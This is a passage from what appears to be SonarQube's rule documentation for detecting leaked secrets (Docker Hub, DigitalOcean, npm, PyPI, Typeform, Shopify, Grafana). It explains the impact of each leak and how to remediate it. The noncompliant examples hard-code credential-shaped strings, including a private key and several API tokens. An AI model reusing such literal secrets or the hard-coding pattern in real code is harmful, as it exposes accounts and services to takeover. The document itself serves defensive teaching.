<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p>In most cases, if the key is used as part of a larger trust model (X509, PGP, etc), it is necessary to issue and publish a revocation certificate.
Doing so will ensure that all people and assets that rely on this key for security operations are aware of its compromise and stop trusting it.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
private_key = "-----BEGIN EC PRIVATE KEY-----" \
    "MF8CAQEEGEfVxjrMPigNhGP6DqH6DPeUZPbaoaCCXaAKBggqhkjOPQMBAaE0AzIA" \
    "BCIxho34upZyXDi/AUy/TBisGeh4yKJN7pit9Z+nKs4QajVy97X8W9JdySlbWeRt" \
    "2w==" \
    "-----END EC PRIVATE KEY-----"
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
with open("/path/to/private.key","r") as key_file:
    private_key = key_file.read()
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6782">
              secrets:S6782
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>When an attacker gains access to a Docker Hub personal access token and the username of the account, they can gain access to all container images
accessible to that account.</p>
<h3>What is the potential impact?</h3>
<p>In case of a leaked token, an attacker can read out all private images and are also able to store new malicious images in the registry. This can
have multiple severe consequences.</p>
<h4>Compromise of sensitive source code</h4>
<p>Docker Hub is often used to store private container images. If a personal access token is leaked, it can be used by unauthorized individuals to
gain access to these images. Not only does this allow a malicious person to access and use internal projects, but it can also enable them to leak
sensitive source code, proprietary binaries, and other confidential resources belonging to these projects. This can lead to intellectual property
theft, unauthorized modifications, or even sabotage of your software.</p>
<p>If these private images contain other secrets, it might even lead to further breaches in the organization’s services.</p>
<h4>Supply chain attacks</h4>
<p>If the leaked secret gives an attacker the ability to publish code to private packages or repositories under the name of the organization, then
there may exist grave consequences beyond the compromise of source code. The attacker may inject malware, backdoors, or other harmful code into these
private repositories.</p>
<p>This can cause further security breaches inside the organization, but will also affect clients if the malicious code gets added to any products.
Distributing code that (unintentionally) contains backdoors or malware can lead to widespread security vulnerabilities, reputational damage, and
potential legal liabilities.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
steps:
  - name: Login to DockerHub
    uses: docker/login-action@v2
    with:
      username: mobythewhale
      password: dckr_pat_cq7wQZcv9xZkVlxMhDTcTV00CDo
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
steps:
  - name: Login to DockerHub
    uses: docker/login-action@v2
    with:
      username: ${{ secrets.dockerUsername }}
      password: ${{ secrets.dockerAccessToken }}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p>Docker docs - <a href="https://docs.docker.com/docker-hub/access-tokens/">Create and manage access tokens</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6755">
              secrets:S6755
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>If an attacker gains access to a DigitalOcean personal access token or OAuth token, they might be able to compromise your DigitalOcean environment.
This includes control over Droplets and any applications that are running, as well as databases and other assets that are managed by the account.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker manages to gain access to the DigitalOcean environment, there exist several ways that they could seriously harm your organization.
Any data that is stored in the environment could be leaked, but the environment itself could even be tampered with.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Infrastructure takeover</h4>
<p>By obtaining a leaked secret, an attacker can gain control over your organization’s DigitalOcean infrastructure. They can modify DNS settings,
redirect traffic, or launch malicious instances that can be used for various nefarious activities, including launching DDoS attacks, hosting phishing
websites, or distributing malware. Malicious instances may also be used for resource-intensive tasks such as cryptocurrency mining.</p>
<p>This can result in legal liability, but also increased costs, degraded performance, and potential service disruptions.</p>
<p>Furthermore, corporate DigitalOcean infrastructures are often connected to other services and to the internal networks of the organization. Because
of this, cloud infrastructure is often used by attackers as a gateway to other assets. Attackers can leverage this gateway to gain access to more
services, to compromise more business-critical data and to cause more damage to the overall infrastructure.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
require 'droplet_kit'

token = 'dop_v1_1adc4095c3c676ff1c31789a1a86480195a5b3d955010c94fcfa554b34640e1e'  # Noncompliant
client = DropletKit::Client.new(access_token: token)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
require 'droplet_kit'

token = ENV['DIGITALOCEAN_TOKEN']
client = DropletKit::Client.new(access_token: token)
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p>DigitalOcean Documentation - <a href="https://docs.digitalocean.com/reference/api/create-personal-access-token/">How to Create a Personal Access
Token</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6758">
              secrets:S6758
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>If an attacker gains access to an NPM access token, they might be able to gain access to any private package linked to this token.</p>
<h3>What is the potential impact?</h3>
<p>The exact impact of the compromise of an NPM access token varies depending on the permissions granted to this token. It can range from loss of
sensitive data and source code to severe supply chain attacks.</p>
<h4>Compromise of sensitive source code</h4>
<p>The affected service is used to store private packages and repositories. If a token is leaked, it can be used by unauthorized individuals to gain
access to your sensitive code, proprietary libraries, and other confidential resources. This can lead to intellectual property theft, unauthorized
modifications, or even sabotage of your software.</p>
<p>If these private packages contain other secrets, it might even lead to further breaches in the organization’s services.</p>
<h4>Supply chain attacks</h4>
<p>If the leaked secret gives an attacker the ability to publish code to private packages or repositories under the name of the organization, then
there may exist grave consequences beyond the compromise of source code. The attacker may inject malware, backdoors, or other harmful code into these
private repositories.</p>
<p>This can cause further security breaches inside the organization, but will also affect clients if the malicious code gets added to any products.
Distributing code that (unintentionally) contains backdoors or malware can lead to widespread security vulnerabilities, reputational damage, and
potential legal liabilities.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
steps:
    - run: |
        npm install
    - env:
        NPM_TOKEN: npm_tCEMceczuiTXKQaBjGIaAezYQ63PqI972ANG
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
steps:
    - run: |
        npm install
    - env:
        NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
</pre>
<h3>Going the extra mile</h3>
<h4>Reducing the permission scope per secret</h4>
<p>By reducing the permission scope, the token is granted only the minimum set of permissions required to perform its intended tasks. This follows the
principle of least privilege, which states that a user or token should have only the necessary privileges to carry out its specific functions. By
adhering to this principle, the potential attack surface is minimized, reducing the risk of unauthorized access or misuse of sensitive resources.</p>
<p>Additionally, if a token is compromised, the reduced permissions scope limits the potential damage that can be done. With fewer permissions, the
attacker’s ability to access or modify critical resources is restricted, reducing the impact of the compromise.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<p>npm Docs - <a href="https://docs.npmjs.com/revoking-access-tokens">Revoking access tokens</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6751">
              secrets:S6751
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>The exact consequences of a PyPI API token compromise can vary depending on the scope of the affected token. Depending on this factor, the attacker
might get access to the full account the token is bound to or only to a project belonging to that user.</p>
<p>In any case, such a compromise can lead to source code leaks, data leaks and even serious supply chain attacks. In general, a reputational loss is
also a common threat.</p>
<h4>Compromise of sensitive source code</h4>
<p>The affected service is used to store private packages and repositories. If a token is leaked, it can be used by unauthorized individuals to gain
access to your sensitive code, proprietary libraries, and other confidential resources. This can lead to intellectual property theft, unauthorized
modifications, or even sabotage of your software.</p>
<p>If these private packages contain other secrets, it might even lead to further breaches in the organization’s services.</p>
<h4>Supply chain attacks</h4>
<p>If the leaked secret gives an attacker the ability to publish code to private packages or repositories under the name of the organization, then
there may exist grave consequences beyond the compromise of source code. The attacker may inject malware, backdoors, or other harmful code into these
private repositories.</p>
<p>This can cause further security breaches inside the organization, but will also affect clients if the malicious code gets added to any products.
Distributing code that (unintentionally) contains backdoors or malware can lead to widespread security vulnerabilities, reputational damage, and
potential legal liabilities.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<p>For PyPI, <code>keyring</code> is a recommended solution to securely store secrets. Further explanation is given in the example below.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>PyPI API tokens can be used to authenticate with PyPI by setting the token as a password in <code>.pypirc</code>.</p>
<pre>
[pypi]
username = __token__
password = pypi-YBf3ZAIKOMPwNZ1VaQ0RAtjww5lI1az1CMLEOWgDQN56EPADfzRmgsENVcmIUh2mSBwYlTtyNKGmVlLm2MZD2aJOTWmD2EO5PMyWjvUY3Ii2CjsidALCNCNmvX8N8gcijBliFN2ciBCLgQdi2YYfGjA1kz19z1UBKg
</pre>
<h4>Compliant solution</h4>
<p>Instead, Python’s <a href="https://pypi.org/project/keyring/"><code>keyring</code> package</a> can be used to securely authenticate with PyPI. Once
<code>keyring</code> is installed using pip, it should be used for authentication automatically. It is also possible to configure it manually using
the following:</p>
<pre>
pip config set --global global.keyring-provider subprocess
</pre>
<h3>Going the extra mile</h3>
<h4>Reducing the permission scope per secret</h4>
<p>By reducing the permission scope, the token is granted only the minimum set of permissions required to perform its intended tasks. This follows the
principle of least privilege, which states that a user or token should have only the necessary privileges to carry out its specific functions. By
adhering to this principle, the potential attack surface is minimized, reducing the risk of unauthorized access or misuse of sensitive resources.</p>
<p>Additionally, if a token is compromised, the reduced permissions scope limits the potential damage that can be done. With fewer permissions, the
attacker’s ability to access or modify critical resources is restricted, reducing the impact of the compromise.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> pip Documentation - <a href="https://pip.pypa.io/en/stable/topics/authentication/#authentication">Authentication</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6768">
              secrets:S6768
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>If an attacker gains access to a Typeform personal access token, they might be able to compromise the data that is accessible to the linked
Typeform account. By doing so, it might be possible for customer data to be leaked by the attacker.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker gains access to forms and the data linked to the forms, your organization may be impacted in several ways.</p>
<h4>Data compromise</h4>
<p>Typeform often is used to store private information that users have shared through their forms. This is called <a
href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br> The leaked app key could provide a gateway for
unauthorized individuals to access and misuse this data, compromising the privacy and safety of the application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive personal information. If this kind of sensitive
personal data gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h4>Phishing attacks</h4>
<p>An attacker can use the Typeform access token to lure them into links to a malicious domain controlled by the attacker.</p>
<p>They can use the data stored in the forms to create attacks that look legitimate to the victims. In some cases, they might even edit existing forms
to lead users to a malicious domain directly.</p>
<p>Once a user has been phished on a legitimate-seeming third-party website, the attacker can trick users into submitting sensitive information, such
as login credentials or financial details. This can lead to identity theft, financial fraud, or unauthorized access to other systems.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import requests

token = 'tfp_DEueEgDipkmx52r7rgU5EC7VC5K2MzzsR61ELEkqmh3Y_3mJqwKJ2vtfX5N'  # Noncompliant
response = requests.get('https://api.typeform.com/forms', headers={
    'Authorization': f'Bearer {token}',
    'Content-Type': 'application/json'
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import requests

token = os.getenv('TYPEFORM_PERSONAL_ACCESS_TOKEN')
response = requests.get('https://api.typeform.com/forms', headers={
    'Authorization': f'Bearer {token}',
    'Content-Type': 'application/json'
})
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p>Typeform Developers - <a
href="https://www.typeform.com/developers/get-started/personal-access-token/#regenerate-your-personal-access-token">Regenerate your personal access
token</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6769">
              secrets:S6769
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>If an attacker gains access to a Shopify app token or a Shopify Partners token, they might be able to compromise the Shopify environment linked to
this token. As this environment typically contains both important financial data and the personal information of clients, a breach by a malicious
entity could have a serious impact on the organization.</p>
<h3>What is the potential impact?</h3>
<p>Shopify contains both important information about customers, as well as financial information in general. If an attacker manages to get access to
either of those through a leaked secret, they could severely impact the business in multiple ways.</p>
<h4>Compromise of sensitive personal data</h4>
<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users
have shared on the platform. This is called <a href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br>
The leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the
application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data
gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<p>Furthermore, the personal identifiable information contained by the Shopify platform could be used for phishing. Not sufficiently protecting the
sensitive information of clients, such as addresses, email addresses and even financial information, can directly hurt these clients and will also
hurt the reputation of the organization.</p>
<h4>Disclosure of financial data</h4>
<p>When an attacker gains access to an organization’s financial information, it can have severe consequences for the organization. One of the primary
concerns is the potential leakage of sensitive financial data. This information may include bank account details, credit card information, or
confidential financial reports. If this data falls into the wrong hands, it can be used for malicious purposes such as identity theft, unauthorized
access to financial accounts, or even blackmail.</p>
<p>The disclosure of financial information can also lead to a loss of confidence and damage the organization’s reputation with its stakeholders.
Customers, partners, and investors place trust in organizations to protect their financial data. In case of a breach, customers may be hesitant to
continue doing business with this company, leading to a loss of revenue and market share. Similarly, partners and investors may reconsider their
long-term collaborations or investments due to concerns about the organization’s overall security posture.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import requests

token = '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'  # Noncompliant
response = requests.get('https://test-shop.myshopify.com/admin/api/2021-07/shop.json', headers={
    'X-Shopify-Access-Token': token,
    'Content-Type': 'application/json'
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import requests

token = os.getenv('SHOPIFY_ACCESS_TOKEN')
response = requests.get('https://test-shop.myshopify.com/admin/api/2021-07/shop.json', headers={
    'X-Shopify-Access-Token': token,
    'Content-Type': 'application/json'
})
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p>Shopify.dev docs - <a href="https://shopify.dev/docs/apps/auth/admin-app-access-tokens#requirements">Access tokens for custom apps in the Shopify
admin</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6762">
              secrets:S6762
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>If an attacker gains access to a Grafana personal access token or Granafa Cloud token, they might be able to compromise the Grafana environment
linked to this token. By doing so, it might be possible for business-critical data to be leaked by the attacker.</p>
<h3>What is the potential impact?</h3>
<p>Depending on the permissions given to the secret, the impact might range from the compromise of the data of some dashboards to a full takeover of
the Grafana environment.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Application takeover</h4>
<p>With control over the Grafana application, the attacker can modify dashboards, alter data sources, or inject malicious code. This can result in the
manipulation of displayed data, misleading visualizations, or even the introduction of backdoors for further exploitation.</p>
<p>The attacker may even attempt to escalate their privileges within the Grafana environment. By gaining administrative access or higher-level
permissions, they can perform more significant actions, such as modifying access controls, adding or deleting users, or changing system
configurations.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import requests

token = 'glsa_geygSnIfuK5vBG0KgaflRCQfIb8mzaM7_b0999d91'  # Noncompliant
response = requests.get('https://grafana.example.org/api/dashboards/home', headers={
    'Authorization': f'Bearer {token}',
    'Content-Type': 'application/json'
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import requests

token = os.getenv('GRAFANA_SERVICE_ACCOUNT_TOKEN')
response = requests.get('https://grafana.example.org/api/dashboards/home', headers={
    'Authorization': f'Bearer {token}',
    'Content-Type': 'application/json'
})
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p>Grafana Documentation - <a href="https://grafana.com/docs/grafana/latest/administration/service-accounts/">Service Accounts</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6686">
              secrets:S6686
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>If a Clarifai API key leaks to an unintended audience, it could potentially lead to unauthorized access to the Clarifai account and its associated
data. This could result in the compromise of sensitive data or financial loss.</p>
<h4>Financial loss</h4>
